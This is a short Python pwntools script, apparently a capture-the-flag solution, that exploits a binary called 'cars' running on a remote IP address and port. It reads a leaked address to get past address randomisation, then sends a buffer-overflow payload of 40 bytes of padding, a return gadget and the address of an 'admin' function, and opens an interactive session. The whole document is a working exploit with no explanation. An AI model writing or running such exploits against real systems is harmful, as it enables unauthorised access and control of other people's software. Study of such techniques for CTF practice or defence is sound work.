from pwn import *

elf = context.binary = ELF("cars")
# p = process()
p = remote("167.99.29.178", 30001)

p.recvuntil(b'Report number: ')
leak = int(p.recvline()[1:]) - 16528

# First input is useless
p.sendline(b'a')    
payload = b'a' * 40 + pack(0x000000000000101a + leak) + pack(elf.symbols['admin'] + leak)
p.sendline(payload)
p.interactive()